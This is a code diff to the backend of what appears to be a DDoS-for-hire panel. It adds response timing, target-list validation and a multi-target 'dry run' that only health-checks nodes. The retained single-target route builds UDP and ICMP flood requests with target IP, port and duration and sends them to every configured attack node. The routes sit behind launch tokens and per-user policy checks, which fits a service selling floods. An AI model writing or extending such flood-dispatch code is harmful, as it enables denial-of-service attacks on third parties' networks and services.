@@ -226,6 +226,7 @@ async function fetchWithTimeout(url, options, ms = 15000) {
 async function checkNodeAvailability(url) {
   const baseUrl = String(url).replace(/\/+$/, "");
   const healthUrl = `${baseUrl}/api/status`;
+  const startedAt = Date.now();
 
   try {
     const response = await fetchWithTimeout(healthUrl, {
@@ -239,6 +240,7 @@ async function checkNodeAvailability(url) {
     return {
       online,
       statusCode: response.status,
+      responseTime: Date.now() - startedAt,
       checkUrl: response.url || healthUrl,
       error: online ? null : `Health check HTTP ${response.status} ${response.statusText}`,
     };
@@ -246,10 +248,92 @@ async function checkNodeAvailability(url) {
     return {
       online: false,
       statusCode: null,
+      responseTime: Date.now() - startedAt,
       checkUrl: healthUrl,
       error: err.name === "AbortError" ? "timed out (5 s)" : err.message,
     };
   }
+}
+
+function normalizeTargetList(value) {
+  const rawTargets = Array.isArray(value) ? value : String(value ?? "").split(",");
+  return [...new Set(rawTargets.map((target) => String(target).trim()).filter(Boolean))];
+}
+
+function validateTargetList(targets) {
+  if (!targets.length) return "Enter at least one IP address";
+  if (targets.length > 64) return "You can process up to 64 IP addresses at a time";
+
+  const invalidTargets = targets.filter((target) => !isIP(target));
+  if (invalidTargets.length) {
+    return `Invalid IP address${invalidTargets.length === 1 ? "" : "es"}: ${invalidTargets.join(", ")}`;
+  }
+
+  return null;
+}
+
+async function allocateHealthyL4Nodes(targets) {
+  const { data: apis, error } = await supabaseAdmin
+    .from("layer4_apis")
+    .select("url")
+    .order("url");
+  if (error) return { error: "Failed to fetch configured L4 nodes" };
+
+  const configuredNodes = (apis ?? []).map((api, index) => ({
+    id: `node-${index + 1}`,
+    url: api.url,
+  }));
+
+  const nodeStatuses = await Promise.all(
+    configuredNodes.map(async (node) => ({
+      ...node,
+      ...(await checkNodeAvailability(node.url)),
+    }))
+  );
+  const onlineNodes = nodeStatuses.filter((node) => node.online);
+  const baseCount = Math.floor(onlineNodes.length / targets.length);
+  const remainder = onlineNodes.length % targets.length;
+  let nodeIndex = 0;
+
+  const assignments = targets.map((target, targetIndex) => {
+    const count = baseCount + (targetIndex < remainder ? 1 : 0);
+    const assignedNodes = onlineNodes.slice(nodeIndex, nodeIndex + count).map((node) => ({
+      ...node,
+      target,
+    }));
+    nodeIndex += count;
+    return { target, nodes: assignedNodes };
+  });
+
+  return { configuredNodes, nodeStatuses, onlineNodes, assignments };
+}
+
+async function runMultiTargetDryRun(assignments) {
+  return Promise.all(
+    assignments.map(async ({ target, nodes }) => {
+      const nodeResponses = await Promise.all(
+        nodes.map(async (node) => {
+          const status = await checkNodeAvailability(node.url);
+          return {
+            node: node.id,
+            status: status.online ? "online" : "offline",
+            responseTime: status.responseTime,
+            statusCode: status.statusCode,
+            error: status.error,
+          };
+        })
+      );
+      const successfulNodes = nodeResponses.filter((node) => node.status === "online").length;
+
+      return {
+        target,
+        assignedNodes: nodes.map((node) => node.id),
+        status: successfulNodes > 0 ? "success" : "failed",
+        nodeResponses,
+        error: successfulNodes > 0 ? null : "No assigned node responded to the health check",
+      };
+    })
+  );
 }
 
 // ── POST /proxy/l7/start ──────────────────────────────────────────────────────
@@ -332,52 +416,16 @@ app.post("/proxy/l7/stop", requireAuth, async (req, res) => {
 });
 
 // ── POST /proxy/l4/start ──────────────────────────────────────────────────────
-// Safe dry-run only: reads the configured node list and prints a balanced
-// node-to-target allocation. It never contacts a node or starts traffic.
+// Single-target requests keep the existing launch path. Multi-target requests
+// use a health-check-only dry run and never contact an attack endpoint.
 app.post("/proxy/l4/allocation-preview", requireAuth, async (req, res) => {
-  const rawTargets = Array.isArray(req.body?.targets)
-    ? req.body.targets
-    : String(req.body?.targets ?? "").split(",");
-  const targets = [...new Set(rawTargets.map((value) => String(value).trim()).filter(Boolean))];
+  const targets = normalizeTargetList(req.body?.targets);
+  const validationError = validateTargetList(targets);
+  if (validationError) return res.status(400).json({ error: validationError });
 
-  if (!targets.length) return res.status(400).json({ error: "Enter at least one IP address" });
-  if (targets.length > 64) return res.status(400).json({ error: "You can preview up to 64 IP addresses at a time" });
-
-  const invalidTargets = targets.filter((target) => !isIP(target));
-  if (invalidTargets.length) {
-    return res.status(400).json({
-      error: `Invalid IP address${invalidTargets.length === 1 ? "" : "es"}: ${invalidTargets.join(", ")}`,
-    });
-  }
-
-  const { data: apis, error } = await supabaseAdmin.from("layer4_apis").select("url").order("url");
-  if (error) return res.status(500).json({ error: "Failed to fetch configured L4 nodes" });
-
-  const configuredNodes = (apis ?? []).map((api, index) => ({
-    id: `node-${index + 1}`,
-    url: api.url,
-  }));
-
-  const nodeStatuses = await Promise.all(
-    configuredNodes.map(async (node) => ({
-      ...node,
-      ...(await checkNodeAvailability(node.url)),
-    }))
-  );
-  const onlineNodes = nodeStatuses.filter((node) => node.online);
-  const baseCount = Math.floor(onlineNodes.length / targets.length);
-  const remainder = onlineNodes.length % targets.length;
-  let nodeIndex = 0;
-
-  const assignments = targets.map((target, targetIndex) => {
-    const count = baseCount + (targetIndex < remainder ? 1 : 0);
-    const assignedNodes = onlineNodes.slice(nodeIndex, nodeIndex + count).map((node) => ({
-      ...node,
-      target,
-    }));
-    nodeIndex += count;
-    return { target, nodes: assignedNodes };
-  });
+  const allocation = await allocateHealthyL4Nodes(targets);
+  if (allocation.error) return res.status(500).json({ error: allocation.error });
+  const { configuredNodes, nodeStatuses, onlineNodes, assignments } = allocation;
 
   console.log(`[allocation-preview] user=${req.user.id} targets=${targets.length} configuredNodes=${configuredNodes.length} onlineNodes=${onlineNodes.length}`);
   nodeStatuses.filter((node) => !node.online).forEach((node) => {
@@ -400,11 +448,12 @@ app.post("/proxy/l4/allocation-preview", requireAuth, async (req, res) => {
     onlineNodeCount: onlineNodes.length,
     offlineNodeCount: configuredNodes.length - onlineNodes.length,
     nodeCount: onlineNodes.length,
-    nodeStatuses: nodeStatuses.map(({ id, url, online, statusCode, error }) => ({
+    nodeStatuses: nodeStatuses.map(({ id, url, online, statusCode, responseTime, error }) => ({
       id,
       url,
       online,
       statusCode,
+      responseTime,
       error,
     })),
     assignments,
@@ -413,11 +462,12 @@ app.post("/proxy/l4/allocation-preview", requireAuth, async (req, res) => {
 
 app.post("/proxy/l4/start", requireAuth, async (req, res) => {
   const { target, port, method, duration, launch_token } = req.body;
+  const targets = normalizeTargetList(target);
 
   const tok = consumeLaunchToken(launch_token, req.user.id);
   if (!tok.ok) return res.status(403).json({ error: tok.reason });
 
-  if (!target || typeof target !== "string" || !target.trim())
+  if (Array.isArray(target) ? !targets.length : (!target || typeof target !== "string" || !target.trim()))
     return res.status(400).json({ error: "Invalid target" });
   if (!L4_METHODS.has(method))
     return res.status(400).json({ error: `Invalid L4 method: ${method}` });
@@ -433,18 +483,54 @@ app.post("/proxy/l4/start", requireAuth, async (req, res) => {
   const policy = await checkPolicy(req, "L4", method, dur);
   if (!policy.ok) return res.status(policy.status).json({ error: policy.error });
 
+  if (targets.length > 1) {
+    const validationError = validateTargetList(targets);
+    if (validationError) return res.status(400).json({ error: validationError });
+
+    const allocation = await allocateHealthyL4Nodes(targets);
+    if (allocation.error) return res.status(500).json({ error: allocation.error });
+
+    const allocations = await runMultiTargetDryRun(allocation.assignments);
+    const successfulTargets = allocations.filter((item) => item.status === "success").length;
+    const failedTargets = allocations.length - successfulTargets;
+
+    console.log(
+      `[multi-target-dry-run] user=${req.user.id} targets=${targets.length} ` +
+      `configuredNodes=${allocation.configuredNodes.length} onlineNodes=${allocation.onlineNodes.length}`
+    );
+    allocations.forEach((item) => {
+      console.log(
+        `[multi-target-dry-run] target=${item.target} ` +
+        `assigned=${item.assignedNodes.join(",") || "none"} status=${item.status}`
+      );
+    });
+
+    return res.json({
+      success: true,
+      mode: "multi_target",
+      dryRun: true,
+      totalTargets: targets.length,
+      successfulTargets,
+      failedTargets,
+      onlineNodes: allocation.onlineNodes.length,
+      totalNodes: allocation.configuredNodes.length,
+      allocations,
+    });
+  }
+
   const { data: apis, error } = await supabaseAdmin.from("layer4_apis").select("url");
   if (error) return res.status(500).json({ error: "Failed to fetch L4 nodes" });
   if (!apis?.length) return res.json({ total: 0, online: 0, results: [] });
 
+  const singleTarget = targets[0] || target.trim();
   let body;
   if (method === "UDP-NORMAL") {
-    body = { method: 1, ip: target.trim(), port: parseInt(port, 10), duration: dur };
+    body = { method: 1, ip: singleTarget, port: parseInt(port, 10), duration: dur };
   } else if (method === "UDP-BYPASS") {
-    body = { method: 2, ip: target.trim(), time: dur };
+    body = { method: 2, ip: singleTarget, time: dur };
   } else {
     // ICMP
-    body = { method: 3, ip: target.trim(), duration: dur };
+    body = { method: 3, ip: singleTarget, duration: dur };
   }
 
   const settled = await Promise.allSettled(
